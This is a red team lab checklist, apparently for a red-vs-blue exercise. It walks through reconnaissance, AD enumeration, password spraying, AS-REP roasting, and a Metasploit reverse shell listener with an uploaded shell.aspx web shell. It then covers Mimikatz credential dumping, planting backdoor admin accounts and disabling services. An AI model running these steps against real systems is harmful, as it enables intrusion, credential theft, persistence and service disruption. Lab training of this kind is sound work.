# Red Team Checklist

> This checklist outlines the steps to follow during a red team lab.  
> For commands and detailed instructions, please refer to the [Cheat Sheet](https://github.com/naqibnetlab/Red-Team/blob/main/Cheat-Sheet.md).

---

# Step 1: Reconnaissance and Enumeration

## Nmap

- Create a `hosts.txt` file and add the IP addresses of the targets  
- Run the recommended fast Nmap command:
```
sudo nmap -A --oX target_scan.xml -iL hosts.txt
```  
- (Optional) Convert the output to HTML using `xsltproc` and open it in a browser  

- Identify for each target:
  - Open ports  
  - Key services (e.g., 22, 53, 80, 8080)  
  - Operating system (if possible)  
  - Hostname and domain name

- Identify the Domain Controller (DC):
  - Look for naming patterns like `dc.<domain-name>.<tld>`  
  - Determine the domain name  


## Configure DNS (Kali Linux)
> Note: This is NOT a recon task itself, but proper DNS
> configuration helps you gather more information about the target
> and perform attacks more effectively in domain environments.


- Add the IP address of the Domain Controller (DC) as your DNS server  
- Add the target domain as your search domain  
- Follow [Kali Linux Network Configuration (GUI)](https://github.com/naqibnetlab/Red-Team/blob/main/Cheat-Sheet.md#kali-linux-network-configuration-gui) in the cheat sheet  
- Do NOT change your IP address — only update DNS settings  


## Enumeration (SMB / AD)

- Use [enum4linux](https://github.com/naqibnetlab/Red-Team/blob/main/Cheat-Sheet.md#enum4linux) or [NetExec](https://github.com/naqibnetlab/Red-Team/blob/main/Cheat-Sheet.md#netexec) against Windows Machines

- Enumerate and collect:
  - Usernames and save them to `users.txt`  
  - Group memberships of users  
  - Shares folders 
  - Password policy  


## Web Enumeration

- Identify targets with HTTP (port 80) open  
- Run [Gobuster](https://github.com/naqibnetlab/Red-Team/blob/main/Cheat-Sheet.md#3-gobuster) against those targets


---

# Step 2: Weaponization & Delivery

> Note: Most of the Weaponization tasks are only against Windows targets.

1. Perform a password spray attack.  
   - If you find valid credentials, move to the [Initial Access](https://github.com/naqibnetlab/Red-Team/blob/main/Cheat-Sheet.md#section-5-initial-access) section and continue attacks on all Windows machines.

2. Use Impacket `GetNPUsers` to request AS-REP hashes and attempt to crack them with hashcat.  
   - If you recover any passwords, move to the [Initial Access](https://github.com/naqibnetlab/Red-Team/blob/main/Cheat-Sheet.md#section-5-initial-access) section.

3. If file upload is available on the target, then follow the **Reverse Shells** section in [Initial Access](https://github.com/naqibnetlab/Red-Team/blob/main/Cheat-Sheet.md#section-5-initial-access):
   - Generate a Windows reverse shell payload using `msfvenom`
   - Start a listener using Metasploit:
```bash
msfconsole
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp   # must match msfvenom
set LHOST 10.100.0.1                              # same IP as above
set LPORT 4444                                    # same port as above
run
```
   - Upload the payload (e.g., `shell.aspx`) to the target
   - Execute it via browser:
```bash
http://<target-ip>/<path-to>/shell.aspx
```
   - If you get a reverse shell, continue to the next steps

4. If you have valid credentials:
   - Run `bloodhound-python` to collect domain data in JSON fomrat
   - Open the Firefox browser to go to bloodhoun
   - Go to: `http://localhost:8080`
   - Upload the JSON files
   - Analyze paths for privilege escalation opportunities
  
5. Refer to additional delivery methods if you need to deliver payloads/malware to the Windows or Linux targets.

---

# Step 3: Initial Access

See the [Initial Access](https://github.com/naqibnetlab/Red-Team/blob/main/Cheat-Sheet.md#section-5-initial-access) section in the Cheat Sheet.

Try to gain access to the target machines. As soon as you achieve initial access, move to [Section 6: Actions on Objective](https://github.com/naqibnetlab/Red-Team/blob/main/Cheat-Sheet.md#section-6-actions-on-objective).

## Windows Access
- [ ] Try RDP access (xfreerdp3)  
- [ ] Try WinRM access (evil-winrm) 
- [ ] Try SMB access (smbclient)
- [ ] Attempt reverse shell  
- [ ] Test default credentials on login pages  

## Linux Access
- [ ] Try SSH access
- [ ] Attempt reverse shell
- [ ] Test default credentials on login pages

---

# Step 6: Actions on Objective

See the [Actions on Objective](https://github.com/naqibnetlab/Red-Team/blob/main/Cheat-Sheet.md#section-6-actions-on-objective) section in the Cheat Sheet.

> Note:
> - If you already have **administrator/root access**, you can skip the privilege escalation steps.  
> - The **ultimate goal is service disruption**, so prioritize disabling services when possible.

## 1. Privilege Escalation

### Windows
- [ ] Use BloodHound to identify attack paths
- [ ] Dump credentials with Mimikatz

### Linux
- [ ] Check SUID binaries
- [ ] Check capabilities
- [ ] Check Docker group abuse

## 2. Administrative Account Creation

### Windows
- [ ] Create a Domain Admin account, so you can login with it if Blue Team change password for other accounts
- [ ] Create a local Administrator account

### Linux
- [ ] Create a sudo user

## 3. Service Disruption (Main Objective)

### Windows
- [ ] Stop critical services on your list
- [ ] Change service type to Disable

### Linux
- [ ] Stop services using systemctl
- [ ] Disable services

### Docker / Containers
- [ ] Stop Docker service
- [ ] Stop all running containers 
- [ ] Bring down docker-compose services
